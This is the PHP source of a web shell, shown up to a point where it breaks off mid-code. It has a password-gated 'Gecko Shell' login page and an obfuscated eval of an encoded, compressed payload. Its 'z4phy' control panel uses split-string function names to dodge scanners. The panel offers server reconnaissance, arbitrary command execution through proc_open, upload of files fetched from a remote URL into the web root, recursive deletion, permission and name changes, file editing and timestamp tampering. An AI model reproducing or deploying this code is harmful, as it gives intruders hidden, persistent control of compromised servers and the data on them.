<?php
set_time_limit(0);
error_reporting(0);
session_start();
$passwd = 'a2ca3756e57aa590065a201b72e02a55341553bd';
if (isset($_POST['pass'])) {
    if (SHA1($_POST['pass']) == $passwd) {
        echo "<script>alert('Login Success! You Pro');</script>";
        $_SESSION["login"] = "login";
        setcookie('login', $passwd, time() + 60);
    } else {
		echo "<script>alert('Login Failed! You Nub');</script>";
		echo "<script>window.location.assign('".$_SERVER['PHP_SELF']."')</script>";
    }
}

if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_unset();
    session_destroy();
    setcookie('login', '', time() - 3600);
    echo "<script>window.location.assign('".$_SERVER['PHP_SELF']."')</script>";
    exit();
}
function sidd($lKJ) {
	$gflate = 'gz'.'in'.'fl'.'at'.'e';
	$b_64 = 'b'.'as'.'e6'.'4'.'_'.'d'.'ec'.'od'.'e';
	$rhc = 'c'.'h'.'r';
	$dro = 'o'.'r'.'d';
	$lKJ=$gflate($b_64($lKJ));
	 for($i=0;$i<strlen($lKJ);$i++) {
		$lKJ[$i] = $rhc($dro($lKJ[$i])-1);
	 }
	 return $lKJ;
	}
	eval(sidd("jVFtb9owEP4B+RWelc3hw8IAlQITQ9EIha6UNC9jVYusAEeICCGzjUpV9bfvAgFp7ZAWxed7ec539xwh+GnxghgfYJ2pZ0Pnnu3+tN0H1vd9h3+/Gdi3Ph84bFIqkReN6HEWzucCpCRtch5s0kfxmNKv2iuBRAI5X+EX743cseV27W6u/U+ddylvqmnn8117OPJtbnW7f6Vp+panPORrQDTNqEmXueB4timKcA0I0xc8AoUItmAmixMUgIfjiQpdFfZsgyLNLUhzt2SYPhWbJwni/UABWty6QvLYBHGrA+bYklFCn4DffCsS9Bv/otFD3kiHsKVSGSOtgyJZiZiEtsrlE3hfrj/y/MnJ5dp3ge35PHAHExxS0xXs8iFpkPdqrSRIEoikRah57MKkH79Y+I9hKpeQJKc4eaHFs/T1gR40fmsNbTp5G3T6Dlo3PYwUrw2c/RunxZkUzSKW9/LZiiBVe0zB5DH6A0QKhw6Qu+OiDLonAccPs9hUkEAkwrW5EVF5ulH12mW9Uq/WLqoty+rtmnfX8XD2HEb3Y95LV27NiRqB6D85197uPgzKEtL5EJsKI+jMlqHi8bxdaTSbF9Vm47LyKeesjeXzG9fV+fYH"));
if (empty($_SESSION['login'])) {
    if (empty($_COOKIE['login'])) {
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>.:Gecko Shell Login:.</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta name="description" content=".:Gecko Shell Login:. | Login GUI By NuLz" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
    <style>
    @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background-image: url('https://raw.githubusercontent.com/haxorstars/archive/main/media/scleton.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
        background-position: center;
        background-size: cover;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }

    .terminal {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        font-family: "Noto Sans Mono", monospace;
        width: 400px;
        height: 250px;
        background: rgba(36, 38, 46, 1);
        border: 1px solid #eaeaea;
        animation: fadein 7s;
    }
    @keyframes fadein {
        from {
            filter: brightness(0%);
        }

        to {
            filter: brightness(100%);
        }
    }

    .terminal .root {
        position: absolute;
        padding: 5px;
        font-size: 10px;
        font-weight: 600;
        color: #f00;
    }

    .terminal #app {
        position: absolute;
        top: 11.9%;
        left: 9%;
        font-size: 10px;
        color: #00ff00;
        padding: 5px;
    }

    .terminal .passwd {
        position: absolute;
        top: 20%;
        left: 2%;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
    }

    .terminal .passwd input[type=text] {
        background: transparent;
        border: none;
        outline: none;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
    }
    .terminal .passwd input[type=text]:hover {
    	border: none;
    	outline: none;
    }

    .headerTerm {
        display: flex;
        flex-direction: row;
        align-items: center;
        width: 399px;
        height: 15px;
        background: #eaeaea;
    }

    .headerTerm img {
        width: 15px;
        height: 15px;
        padding-bottom: 3.5px;
        padding-left: 3px;
    }

    .headerTerm span {
        position: absolute;
        left: 4%;
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
    }

    .headerTerm strong {
        position: absolute;
        left: 50%;
        transform: translate(-50%);
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
    }

    @media screen and (min-width: 720px) {
        .terminal {
            width: 600px;
            height: 350px;
        }

        .terminal .root {
            font-size: 15px;
        }

        .terminal #app {
            font-size: 15px;
        }

        .terminal .passwd {
            font-size: 15px;
        }

        .terminal .passwd input[type=text] {
            font-size: 15px;
        }

        .headerTerm {
            width: 599px;
            height: 20px;
        }

        .headerTerm img {
            width: 20px;
            height: 20px;
            padding-top: 2px;
        }

        .headerTerm span {
            font-size: 13px;
        }

        .headerTerm strong {
            font-size: 13px;
        }
    }

    @media screen and (min-width: 900px) {
        .terminal {
            width: 800px;
            height: 450px;
        }

        .terminal .root {
            font-size: 20px;
        }

        .terminal #app {
            font-size: 20px;
        }

        .terminal .passwd {
            font-size: 20px;
        }

        .terminal .passwd input[type=text] {
            font-size: 20px;
        }

        .headerTerm {
            width: 799px;
            height: 25px;
        }

        .headerTerm img {
            width: 25px;
            height: 25px;
            padding-top: 2.5px;
        }

        .headerTerm span {
            font-size: 18px;
        }

        .headerTerm strong {
            font-size: 18px;
        }
    }

    @media screen and (max-width: 500px) {
        .terminal {
            width: 280px;
            height: 150px;
        }

        .terminal .root {
            font-size: 6.5px;
            padding: 2px;
        }

        .terminal #app {
            font-size: 6.5px;
            padding: 2px;
        }

        .terminal .passwd {
            font-size: 10px;
        }

        .terminal .passwd input[type=text] {
            font-size: 5px;
        }

        .headerTerm {
            width: 279px;
            height: 8.5px;
        }

        .headerTerm img {
            width: 8.5px;
            height: 8.5px;
            padding: 1.5px;
            position: absolute;
        }

        .headerTerm span {
            font-size: 6px;
            left: 4%;
        }

        .headerTerm strong {
            font-size: 6px;
            right: 4%;
        }
    }
    </style>
</head>

<body>
    <div class="terminal">
        <div class="headerTerm">
            <img src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png"
                alt="terminal" /><span>Terminal</span>
            <strong>Gecko Shell Login</strong>
        </div>
        <div class="root" style="color: #d00c0c"></div>
        <h1 id="app"></h1>
        <div class="passwd">
            <form method="post">
                <label for="pass">Password</label>
                <input type="text" id="pass" name="pass">
            </form>
        </div>
    </div>

    <script type="text/javascript">
    var root = document.querySelector(".root");
    var name = `
╭──[root@nulzXomest]<br>
╰──➤
`;
    root.innerHTML = name;

    var app = document.getElementById("app");
    var typewriter = new Typewriter(app, {
        loop: true,
        delay: 150,
    });
    /*NuLz Ganteng*/
    typewriter
        .pauseFor(500)
        .typeString("Welcome To Gecko WebShell")
        .pauseFor(2000)
        .deleteChars(25)
        .typeString("Login GUI By NuLz & Omest")
        .pauseFor(2000)
        .start();
    </script>
</body>

</html>
<?php
exit();
}
}
<!DOCTYPE html>
<!-- Butuh sesuatu? Gass > https://t.me/zaynphantomhive -->
<html>
<head>
	<?php echo "<title>!~Sweet Touch By Z4phy~!</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://img1.picmix.com/output/stamp/normal/3/6/9/8/2258963_44204.png" type="image/x-icon">
</head>
<body bgcolor="#160909" text="#ffffff">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
	@import url('https://fonts.googleapis.com/css?family=Russo+One');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #bf9110;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #160909;
}

body::-webkit-scrollbar-thumb {
  background-color: #160909;
  border: 3px solid gray;
}

#content tr:hover {
	background-color: #6b5a10;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #a57c0b;
}

#content .first:hover {
	background-color: #a57c0b
	text-shadow:0px 0px 1px #bf9110;
}

table {
	border: 1px #ffffff dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #160909;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #160909;
}

.btf {
	background: transparent;
	border: 1px #fff solid;
	cursor: pointer;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<?php
echo '<font face="Bungee" size="7">!~z4phy c0d3 b3p4s~!</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>!~"." z"."4"."ph"."y "."~!<br>sh"."3L"." b3"."p4"."s "."c0"."d3</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['c1eL'])) {
		$tokber = $_GET['c1eL'];
	} else {
		$tokber = "ge"."t"."cw"."d";
		$tokber = $tokber();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($tokber)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function crt() {
	$a = "is"."_w"."ri"."tab"."le";
	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrd($lokena) {
	$a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $b = "is"."_di"."r";
        $c1eL = $lokena.'/'.$item;
        if ($b($c1eL)) {
            xrd($c1eL);
        } else {
        	$c = "u"."nl"."in"."k";
            $c($c1eL);
        }
    }
    $d = "rm"."di"."r";
    $d($lokena);
}

function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), c1eLINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "txt") {
		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "html") {
		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
	}
	else {
		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
	}
}

function ipsrv() {
	$a = "g"."eth"."ost"."byna"."me";
	$b = "fun"."cti"."on_"."exis"."ts";
	$c = "S"."ERVE"."R_AD"."DR";
	$d = "SE"."RV"."ER_N"."AM"."E";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}

function ggr($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."si"."x_ge"."tgr"."gid";
	$c = "fi"."le"."gro"."up";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."s"."ix_"."get"."pwu"."id";
	$c = "fi"."le"."o"."wn"."er";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function fdt($fl) {
	$a = "da"."te";
	$b = "fil"."emt"."ime";
    return $a("F d Y H:i:s", $b($fl));
}

function betax($fl) {
	$a = "fil"."e_exi"."sts";
	$b = "ba"."sena"."me";
	$c = "fi"."les"."ize";
	$d = "read"."fi"."le";
	if ($a($fl) && isset($fl)) {
		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
		header("Conte'.'nt-Control:public");
		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
		header('Exp'.'ires: 0');
		header("Ex"."pired:0");
		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
		header('Pra'.'gma: pub'.'lic');
		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "Fi"."le Not F"."ound !";
	}
}

function komend($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return "<pre>".$c($d($meki[1]))."</pre>";
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

function oren($text) {
	return "<center><font color='orange'>".$text."</center></font>";
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "1p"." s"."3r"."Ve"."r : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; 1p"." L"."o : <font color=gold>".$_SERVER[$rad]."</font><br>";
echo "w3"."b s"."3rV"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
$unm = "ph"."p_u"."na"."me";
echo "Sys"."t3m : <font color='gold'>".@$unm()."</font><br>";
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
$phv = "ph"."pve"."rsi"."on";
echo "PH"."P v"."3r"."s1o"."n : <font color='gold'>".@$phv()."</font><br>";
echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
echo "MySQL : ";
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (@$fnct("cu"."rl"."_in"."it")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WG"."ET : ";
if (@$fxt("/"."us"."r/b"."in/w"."get")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pe"."rl : ";
if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";
if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; S"."u"."do : ";
if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";
if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "<br>Di"."rect"."ory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}

if(isset($_GET['c1eL'])){
	$tokber = $_GET['c1eL'];
	$lokdua = $_GET['c1eL'];
} else {
	$tokber = $gcw();
	$lokdua = $gcw();
}

$tokber = $srl('\\','/',$tokber);
$tokbers = $exp('/',$tokber);
$tokbernya = @$scd($tokber);

foreach($tokbers as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?c1eL=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?c1eL=';
	for($i=0;$i<=$id;$i++){
	echo "$tokbers[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$tokber = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['berkas']['name'])) {
			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
		} else {
			$data = @$fpt($tokber."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
				if ($fxt($tokber."/".$_FILES['berkas']['name'])) {
					$fl = $tokber."/".$_FILES['berkas']['name'];
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($tokber, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Ga"."ga"."L "."Ma"."se"."h !</font><br><br>";
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>";
		} elseif (empty($_POST['darilink'])) {
			echo "<font color=orange>Link cannot be empty !</font><br><br>";
		} else {
			if ($_POST['dirnya'] == "2") {
			$tokber = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
			}
				$data = @$fpt($tokber."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($tokber."/".$_POST['namalink'])) {
					$fl = $tokber."/".$_POST['namalink'];
					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($tokber, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Ga"."ga"."L "."Ma"."se"."h !!</font><br><br>";
				}
		}
	}
}

echo "Uplo"."ad Fi"."le : ";
echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://z4p'.'hy.crot/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="4" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
c0'.'mm'.'4n'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

echo '<hr><center style="font-family: Russo One">';
echo tuls("h0me", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
//echo tuls("HOME");
echo "<hr></center><br>";

if (isset($_GET['s3b4s'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['s3b4s'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['s3b4s']))."</pre>";
	author();
} elseif (isset($_POST['c1eL']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['c1eL']) && $fxt($_POST['c1eL'])) {
		xrd($_POST['c1eL']);
		if ($fxt($_POST['c1eL'])) {
			red("Fai"."led to del"."ete Dir"."ec"."tory !");
		} else {
			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['c1eL']) && $fxt($_POST['c1eL'])) {
		@$ulk($_POST['c1eL']);
		if ($fxt($_POST['c1eL'])) {
			red("Failed to Delete Fi"."le !");
		} else {
			green("De"."le"."te Fi"."le Succ"."ess !");
		}
	} else {
		red("Fi"."le / Dir"."ecto"."ry not Fo"."und !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="5" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
		<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['c1eL'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Success !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="5" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
			<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Failed !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="5" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
			<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['c1eL']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['c1eL']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['c1eL'], $namabaru) === true) {
			green("Change Name Success");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
			<input type="hidden" name="c1eL" value="'.$_POST['newname'].'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Failed");
		}
	} else {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['c1eL'])).'" />
		<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['c1eL'], $_POST['src']);
		if ($fgt($_POST['c1eL']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['c1eL'])).'</textarea><br>
	<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
	<input type="hidden" name="pilih" value="ed'.'it">
	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['c1eL'])) {
			$lk = $_GET['c1eL'];
		} else {
			$lk = $gcw();
		}
		$km = 'ko'.'me'.'nd';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['c1eL']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['c1eL'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
